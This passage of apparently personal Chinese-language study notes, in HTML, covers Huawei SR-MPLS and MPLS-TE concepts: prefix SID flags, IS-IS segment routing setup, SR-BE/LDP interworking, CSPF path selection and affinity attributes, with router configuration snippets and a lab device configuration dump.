Lable</p>\n<p>存在倒数第二跳弹出，实际 19040 会变为 3</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1645374024961-016f137e-1813-497a-941a-5f940ffe0190.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tracert lsp segment ip 4.4.4.4 32 ver d</span><br><span class=\"line\">//看Segment Routing的标签转发表信息</span><br><span class=\"line\">display segment-routing prefix mpls forwarding</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1645374210842-a5d77af0-bd44-4659-8bc4-29d0d5a541de.png\" alt=\"img\"></p>\n<p>每台设备通过扩展的路由协议通告自己的 SRGB。</p>\n<p>节点通过扩展的路由协议通告前缀 SID 索引 (Index) 后，各台设备分别根据 SRGB 计算入站及出站 SID。</p>\n<p>1、建议每台设备配置一样的 SRGB</p>\n<p>2、基于全局的 prefix SID 统一标签值，方便管理一些。此时每台设备 index 需要唯一</p>\n<p>MPLS-BE 场景</p>\n<p>1. 基于 prefix-segment</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1645374929567-d3e112af-1144-4823-b44f-503e393cad0d.png\" alt=\"img\"></p>\n<p>2. 基于 adjacency segment</p>\n<p>segment-routing auto-adj-sid disable 命令关闭动态邻接标签</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1645374954780-23325eae-ad31-4c4b-b044-4876095d1c98.png\" alt=\"img\"></p>\n<p>3. 基于 adjacency segment+prefix-segment</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1645374976244-cae7b3c0-6b36-4713-becd-d6b477998564.png\" alt=\"img\"></p>\n<p>使用承载业务</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1645377347132-0fa0a128-f5d2-4a00-b649-4b483465be71.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tunnel policy to_pe4</span><br><span class=\"line\">tunnel select-seq se-lsp load 8</span><br><span class=\"line\"></span><br><span class=\"line\">ip vpn site_a</span><br><span class=\"line\">ipv4</span><br><span class=\"line\">tnl-policy to_pe4</span><br></pre></td></tr></table></figure>\n<h2 id=\"6prefix-sid-sub-tlv-flag\"><a class=\"markdownIt-Anchor\" href=\"#6prefix-sid-sub-tlv-flag\">#</a> 6.prefix SID sub tlv flag</h2>\n<p>特殊标签同样适用于 SR 场景</p>\n<p>NP：No-PHP（Penultimate Hop Popping，倒数第二跳弹出）标志。如果置位，不启用倒数第二跳弹出特性，倒数第二跳在转发报文给 Egress 节点时，不能弹出 Egress 节点标签。</p>\n<p>M：Mapping Server 标记。如果置位，表示 SID 是由一个 Mapping Server 发布。</p>\n<p>E：显式空标签（Explicit-Null）标志。如果置位，则启用显式空标签特性，上游邻居在转发报文时，必须把标签替换为显式空标签。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mpls                         //egress </span><br><span class=\"line\">label advertise explict-     //通告显示空标签</span><br></pre></td></tr></table></figure>\n<p>V：Value 标志。如果置位，则 Prefix-SID 携带 Value，代替索引（Index）。缺省未置位。</p>\n<p>L：Local 标志。如果置位，表示 Prefix-SID 携带的 Value/Index 具有本地意义。缺省未置位。</p>\n<p>如果 NP 标志置位，然后：E 标志未置位，则任何 Prefix-SID 生成者的上游邻居必须保留对应的 Prefix-SID 标签在标签栈顶。这种方式可能用于路径粘连，比如 Prefix-SID 生成者可能使用该标签将报文转到其他的 MPLS LSP 中。E 标志置位，则任何 Prefix-SID 生成者的上游邻居必须将对应的 Prefix-SID 标签替换为显式空标签。此种方式下可以保留 MPLS EXP 标志位，如果 Prefix-SID 生成者就是报文的目的地址，则可以接收到原始 MPLS EXP。MPLS EXP 标志可以用于 QoS 服务。</p>\n<h2 id=\"sr-mpls-be-解决bgp路由黑洞问题\"><a class=\"markdownIt-Anchor\" href=\"#sr-mpls-be-解决bgp路由黑洞问题\">#</a> SR-MPLS BE 解决 BGP 路由黑洞问题</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">route recursive tunnel</span><br></pre></td></tr></table></figure>\n<p>其他参考 MPLS-LDP 场景</p>\n<h2 id=\"7isis对于实现sr-mpls支持\"><a class=\"markdownIt-Anchor\" href=\"#7isis对于实现sr-mpls支持\">#</a> 7.ISIS 对于实现 SR-MPLS 支持</h2>\n<p>配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[ISIS]</span><br><span class=\"line\">  network-entity </span><br><span class=\"line\">  is-level</span><br><span class=\"line\">  cost-style wide</span><br><span class=\"line\">  segment-routing mpls</span><br><span class=\"line\">  segment-routing global-block 16000 23999</span><br><span class=\"line\">[interface Loopback]</span><br><span class=\"line\">\tisis enable</span><br><span class=\"line\">  isis prefix-sid index 10</span><br><span class=\"line\">[interface Ethe1/0/0]</span><br><span class=\"line\">\tisis enable </span><br></pre></td></tr></table></figure>\n<p>1、ospf 大部分 LSA 报文结构设计相对固定，无法扩展，引入其它 tlv 能力的 LSA 实现扩充</p>\n<p>2、IS-Is 所有报文包括 LSP 天然支持扩充能力，有大量灵活的 tlv，有扩展需求，挂载 tlv 即可</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1645428709138-e3c81cf0-a983-4884-b0da-3404ea43f54c.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230209210945528.png\" alt=\"image-20230209210945528\"></p>\n<h2 id=\"8sr-be与ldp互通\"><a class=\"markdownIt-Anchor\" href=\"#8sr-be与ldp互通\">#</a> 8.SR-BE 与 LDP 互通</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">segment-routing</span><br><span class=\"line\">mapping-server prefix-sid 20.1.1.1 32 999</span><br><span class=\"line\"></span><br><span class=\"line\">ospf</span><br><span class=\"line\">segment mapping-server send</span><br><span class=\"line\"></span><br><span class=\"line\">mpls </span><br><span class=\"line\">lsp-trigger segment-routing-interworking best-effort host</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230210145555435.png\" alt=\"image-20230210145555435\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[HUAWEI-mpls]dis cu </span><br><span class=\"line\">!Software Version V800R011C00SPC607B607</span><br><span class=\"line\">!Last configuration was updated at 2023-02-10 14:50:51+00:00</span><br><span class=\"line\">#</span><br><span class=\"line\">sysname HUAWEI</span><br><span class=\"line\">#</span><br><span class=\"line\">set neid 18a90</span><br><span class=\"line\">#</span><br><span class=\"line\">vsm on-board-mode enable</span><br><span class=\"line\">#</span><br><span class=\"line\">snmp-agent trap type base-trap</span><br><span class=\"line\">#</span><br><span class=\"line\">icmp rate-limit disable</span><br><span class=\"line\">#</span><br><span class=\"line\">mpls lsr-id 8.8.8.8</span><br><span class=\"line\">#</span><br><span class=\"line\">mpls</span><br><span class=\"line\"> lsp-trigger segment-routing-interworking best-effort host</span><br><span class=\"line\">#</span><br><span class=\"line\">mpls ldp</span><br><span class=\"line\"> #</span><br><span class=\"line\"> ipv4-family</span><br><span class=\"line\">#</span><br><span class=\"line\">aaa</span><br><span class=\"line\"> #</span><br><span class=\"line\"> authentication-scheme default0</span><br><span class=\"line\"> #</span><br><span class=\"line\"> authentication-scheme default1</span><br><span class=\"line\"> #</span><br><span class=\"line\"> authentication-scheme default</span><br><span class=\"line\">  authentication-mode local radius</span><br><span class=\"line\"> #</span><br><span class=\"line\"> authorization-scheme default</span><br><span class=\"line\"> #</span><br><span class=\"line\"> accounting-scheme default0</span><br><span class=\"line\"> #</span><br><span class=\"line\"> accounting-scheme default1</span><br><span class=\"line\"> #</span><br><span class=\"line\"> domain default0</span><br><span class=\"line\"> #</span><br><span class=\"line\"> domain default1</span><br><span class=\"line\"> #</span><br><span class=\"line\"> domain default_admin</span><br><span class=\"line\">#</span><br><span class=\"line\">license</span><br><span class=\"line\">#</span><br><span class=\"line\">segment-routing</span><br><span class=\"line\"> mapping-server prefix-sid-mapping 4.4.4.4 32 99 </span><br><span class=\"line\">#</span><br><span class=\"line\">isis 1</span><br><span class=\"line\"> is-level level-2</span><br><span class=\"line\"> cost-style wide</span><br><span class=\"line\"> network-entity 49.0001.0000.0000.0004.00</span><br><span class=\"line\"> segment-routing mpls</span><br><span class=\"line\"> segment-routing global-block 16000 23999</span><br><span class=\"line\"> segment-routing mapping-server send </span><br><span class=\"line\">#</span><br><span class=\"line\">interface Ethernet1/0/0</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.78.8 255.255.255.0</span><br><span class=\"line\"> isis enable 1</span><br><span class=\"line\"> undo dcn</span><br><span class=\"line\"> undo dcn mode vlan</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Ethernet1/0/1</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.38.8 255.255.255.0</span><br><span class=\"line\"> isis enable 1</span><br><span class=\"line\"> mpls</span><br><span class=\"line\"> mpls ldp</span><br><span class=\"line\"> undo dcn</span><br><span class=\"line\"> undo dcn mode vlan</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Ethernet1/0/2</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> undo dcn mode vlan</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Ethernet1/0/3</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> undo dcn mode vlan</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Ethernet1/0/4</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> undo dcn mode vlan</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Ethernet1/0/5</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> undo dcn mode vlan</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Ethernet1/0/6</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> undo dcn mode vlan</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Ethernet1/0/7</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> undo dcn mode vlan</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Ethernet1/0/8</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> undo dcn mode vlan</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Ethernet1/0/9</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> undo dcn mode vlan</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet0/0/0</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 8.8.8.8 255.255.255.255</span><br><span class=\"line\"> isis enable 1</span><br><span class=\"line\"> isis prefix-sid index 40</span><br><span class=\"line\">#</span><br><span class=\"line\">interface NULL0</span><br><span class=\"line\">#</span><br><span class=\"line\">undo dcn</span><br><span class=\"line\">#</span><br><span class=\"line\">lldp enable</span><br><span class=\"line\">#</span><br><span class=\"line\">ssh authorization-type default aaa</span><br><span class=\"line\">#</span><br><span class=\"line\">ssh server cipher aes256_gcm aes128_gcm aes256_ctr aes192_ctr aes128_ctr aes256_</span><br><span class=\"line\">cbc aes128_cbc 3des_cbc</span><br><span class=\"line\">#</span><br><span class=\"line\">ssh server dh-exchange min-len 1024</span><br><span class=\"line\">#</span><br><span class=\"line\">ssh client cipher aes256_gcm aes128_gcm aes256_ctr aes192_ctr aes128_ctr aes256_</span><br><span class=\"line\">cbc aes128_cbc 3des_cbc</span><br><span class=\"line\">#</span><br><span class=\"line\">user-interface con 0</span><br><span class=\"line\">#</span><br><span class=\"line\">user-interface aux 0</span><br><span class=\"line\">#</span><br><span class=\"line\">local-aaa-server</span><br><span class=\"line\">#</span><br><span class=\"line\">vm-manager</span><br><span class=\"line\">#</span><br><span class=\"line\">return</span><br></pre></td></tr></table></figure>\n<h2 id=\"9粘连标签与标签栈\"><a class=\"markdownIt-Anchor\" href=\"#9粘连标签与标签栈\">#</a> 9. 粘连标签与标签栈</h2>\n<p>当标签栈深度超过转发器所支持的标签栈深度时，控制器需要为转发器分配多个标签栈，在合适的节点下发标签栈的同时分配一种特殊的标签，然后将这些标签栈关联起来，实现逐段转发。</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1645544995222-bac36ee4-f184-4267-a87d-75b91dcde1d8.png\" alt=\"img\"></p>\n<h2 id=\"10mpls-te\"><a class=\"markdownIt-Anchor\" href=\"#10mpls-te\">#</a> 10.MPLS-TE</h2>\n<p>MPLS TE 隧道所使用的 LSP 称为基于一定约束条件建立的 LSP (Constraint-based Routed Label Switched Path) ，简称为 CR-LSP。</p>\n<p>约束条件主要包括带宽约束和路径约束两个方面，只有隧道所经过的链路满足约束条件才能成功地建立 CR-LSP，凭借约束条件可以更好地根据现有网络的情况规划业务。</p>\n<p>CR_LSP 单向，一般是在头结点部署</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">isis</span><br><span class=\"line\">is-level level-2</span><br><span class=\"line\">cost wide </span><br><span class=\"line\">network-entity</span><br><span class=\"line\">traffic level-2</span><br><span class=\"line\"></span><br><span class=\"line\">mpls lsr-id</span><br><span class=\"line\">mpls</span><br><span class=\"line\">mpls  te</span><br><span class=\"line\">mpls revp-te</span><br><span class=\"line\"></span><br><span class=\"line\">int ethe 1/0/0</span><br><span class=\"line\">mpls </span><br><span class=\"line\">mpls te</span><br><span class=\"line\">mpls rsvp-te</span><br><span class=\"line\"></span><br><span class=\"line\">头结点 &amp; 伪节点</span><br><span class=\"line\">mpls</span><br><span class=\"line\">mpls te cspf</span><br><span class=\"line\"></span><br><span class=\"line\">int ethe 1/0/0</span><br><span class=\"line\">mpls te bandwidth max 100000</span><br><span class=\"line\">mpls te bandwidth bc0 100000</span><br><span class=\"line\"></span><br><span class=\"line\">int t0/0/1</span><br><span class=\"line\">ip add unnumbered int l 0 </span><br><span class=\"line\">tunnel mpls te</span><br><span class=\"line\">dest 4.4.4.4</span><br><span class=\"line\">mpls te tunnel-id 1</span><br><span class=\"line\">mpls te banswidthct0 60000</span><br></pre></td></tr></table></figure>\n<h3 id=\"101cspf算法\"><a class=\"markdownIt-Anchor\" href=\"#101cspf算法\">#</a> 10.1CSPF 算法</h3>\n<p>根据以下信息来进行 CSPF 算法：</p>\n<p>1. 带宽（链路的最大可预留带宽，BC 带宽，CT 带宽）不满足带宽需求的节点不会出现在最短路径中</p>\n<p>2. 链路属性，可选（链路颜色，隧道颜色） 需要手工配置，用于选路。通过配置隧道颜色来约束选路。隧道接口、设备之间互联链路都需要配置隧道颜色，即亲和属性</p>\n<p>3. 根据 1,2 步骤计算最短路径拓扑之后，出现了两条路径。比较 TE-cost 执行选路。</p>\n<p>通过 CSPF 算法计算后，一旦出现等价路径，采用 CSPF 最高仲裁选择 — 条到尾节点路径</p>\n<h3 id=\"102-路径选择-松散严格显式路径\"><a class=\"markdownIt-Anchor\" href=\"#102-路径选择-松散严格显式路径\">#</a> 10.2 路径选择 - 松散 / 严格显式路径</h3>\n<p>松散显示路径：</p>\n<p>松散方式可以指定路径上必须经过哪些节点，但是该节点和前一跳之间可以存在其他路由器。</p>\n<p>严格显示路径：</p>\n<p>所谓的严格显式路径，就是下一跳与前一跳直接相连。通过严格显式路径，可以最精确地控制 LSP 所经过的路径。</p>\n<p>混合显示路径：</p>\n<p>严格与松散结合</p>\n<h3 id=\"103管理组-亲和属性\"><a class=\"markdownIt-Anchor\" href=\"#103管理组-亲和属性\">#</a> 10.3 管理组、亲和属性</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">管理组（Administration Group）</span><br></pre></td></tr></table></figure>\n<p>也称链路颜色，用来描述链路的属性。由 32 个 Bit 组成，每一位都可以单独表示链路的一个属性，用于管理拥有这些特征的链路，在物理接口下配置。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">亲和属性（Affinity Attributes）</span><br></pre></td></tr></table></figure>\n<p>是用来描述 TE 隧道所需链路的 32 位向量值，与管理组属性类似，在这里可以理解为隧道颜色，在隧道的首节点配置实施（隧道信息，不通过 IGP 发布）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">掩码（Mask）</span><br></pre></td></tr></table></figure>\n<p>由 32 个 Bit 组成，决定了设备需要检查的链路属性，只有隧道颜色和链路颜色匹配才能进行正常的数据转发。实际应用中，就是通过修改掩码来选择链路。</p>\n<p><strong>掩码为 0 的位，不限制链路管理组属性。</strong></p>\n<p><strong>掩码为 1 的位，如果亲和属性为 0，链路管理组属性也必须为 0；如果亲和属性为 1，链路管理组属性至少 1 位是 1 即可。</strong></p>\n<p>在 Tunnel 进行路径选择时，首先需要满足带宽需求，再根据接口（链路）的管理组属性需匹配其亲和属性才有资格被选择。只有带宽匹配不能进行选择</p>\n<p>亲合属性 10101 掩码 11011 管理组属性可能的值为   10001 10000 00001 10101 10100 00101</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[R1-GigabitEthernet1/0/0]mpls te link administrative group 10001  //配置管理组</span><br><span class=\"line\">[R1-Tunnel1]mpls te affinity property 10101 mask 11011</span><br></pre></td></tr></table></figure>\n<p>由于 LSP 中携带亲和属性，因此亲和属性和管理组的匹配都在头结点进行</p>\n<p>有多条隧道时，可以通过隧道优先级来设置优先选择隧道 <code>mpls te priority </code> ，在头结点隧道接口配置</p>\n<p>验证： tracert lsp te tunnel 0/0/1</p>\n<h2 id=\"10sr-mpls-te\"><a class=\"markdownIt-Anchor\" href=\"#10sr-mpls-te\">#</a> 10.SR-MPLS-TE</h2>\n<p>SR-MPLS TE（Segment Routing-MPLS Traffic Engineering）是使用 SR 作为控制协议的一种新型的 TE 隧道技术。SR-MPLS TE 支持采用集中式架构，控制器收集全局网络拓扑信息和 TE 信息，集中算路，然后把算路结果下发给网络设备。</p>\n<p>集中式 SR-MPLS TE：</p>\n<p>1. 扩展 IS-IS/OSPF 携带 TE 信息，在域内泛洪 IGP 和 TE 信息，生成 TEDB。</p>\n<p>2. 通过 BGP-LS 收集网络信息，建立全局 TE 数据库。</p>\n<p>3. 控制器基于约束全局算路。</p>\n<p>4. 使用 PCEP 或 BGP SR Policy 将算路结果下发设备。</p>\n<p>网络拓扑收集</p>\n<p>1.IGP 协议收集网络拓扑信息</p>\n<p>转发器的 IGP 协议收集网络拓扑信息，收集 SR 的邻接标签和节点标签。</p>\n<p>2.BGP-LS 上报网络拓扑信息</p>\n<p>BGP-LS 将带有 SR 标签信息的网络拓扑和 TE 信息上报给控制器。</p>\n<p>使用多个 SID 进行组合来指导数据转发，这种工作机制可以对数据的转发路径进行一定约束，从而满足流量工程的需求，因此被称为 SR-MPLS TE</p>\n<p>SR TE SID 的组合形式：</p>\n<p>使用多个 Adjacency SID。</p>\n<p>使用 Node SID 与 Adjacency SID 组合</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230214221712920.png\" alt=\"image-20230214221712920\"></p>\n<h3 id=\"sp-mpls-te单域\"><a class=\"markdownIt-Anchor\" href=\"#sp-mpls-te单域\">#</a> SP-MPLS TE 单域</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、SR、Is-is规划</span><br><span class=\"line\">2、配置TE相关信息，接口带宽信息</span><br><span class=\"line\">3、SR-MPLS TE头节点tunne1接口</span><br><span class=\"line\"></span><br><span class=\"line\">mpls</span><br><span class=\"line\">mpls te </span><br><span class=\"line\">int ethe 1/0/0</span><br><span class=\"line\">mpls </span><br><span class=\"line\">mpls te </span><br><span class=\"line\"></span><br><span class=\"line\">isis</span><br><span class=\"line\">level 2</span><br><span class=\"line\">wide </span><br><span class=\"line\">netentity</span><br><span class=\"line\">traffic-eng</span><br><span class=\"line\">segment mpls</span><br><span class=\"line\">segment global 16000 23999</span><br><span class=\"line\"></span><br><span class=\"line\">int l 0 </span><br><span class=\"line\">isis pre in 10</span><br><span class=\"line\"></span><br><span class=\"line\">头结点</span><br><span class=\"line\">int t0/0/1 </span><br><span class=\"line\">ip add un in l 0 </span><br><span class=\"line\">tunnel-protocol mpls te</span><br><span class=\"line\">des 4.4.4.4</span><br><span class=\"line\">mpls te singal-protocol segment-routing</span><br><span class=\"line\">mpls te tunnel-di 1 </span><br><span class=\"line\"></span><br><span class=\"line\">头结点</span><br><span class=\"line\">explicit-path  to4pe</span><br><span class=\"line\">next sid label 48140 adja</span><br><span class=\"line\">next sid label 48141 adja</span><br><span class=\"line\">next sid label 48142 adja</span><br><span class=\"line\">int t0/0/1</span><br><span class=\"line\">mplt te ex to4pe</span><br><span class=\"line\"></span><br><span class=\"line\">尾节点</span><br><span class=\"line\"></span><br><span class=\"line\">tunnel-policy pe4</span><br><span class=\"line\">tunnel select sr-te  load 1</span><br><span class=\"line\">ip vpn a</span><br><span class=\"line\">tnl pe4</span><br></pre></td></tr></table></figure>\n<h3 id=\"sp-mpls-te-跨域e2e跨域\"><a class=\"markdownIt-Anchor\" href=\"#sp-mpls-te-跨域e2e跨域\">#</a> SP-MPLS TE 跨域 (E2E 跨域)</h3>\n<p>1. 配置思路</p>\n<p>1、AS10、20 内部规划 IGP IS-IS，并配置 SR-MPLS</p>\n<p>2、端到端配置 MPLS，MPLS TE，每个 AS 内配置 SR-MPLS TE 隧道；PE 之间建立跨域 E2E SR-MPLS TE 隧道</p>\n<p>3、ASBR 之间配置 EBGP 邻居，要求 BGP 可以分配 sID</p>\n<p>4、PE 之间建立 SR-MPLS TE E2E 跨域隧道，使用 tunnel3</p>\n<p>不直接在 PE 之间建立隧道，在 AS 内部 PE 和 ASBR 之间建立隧道，减少标签栈深度</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 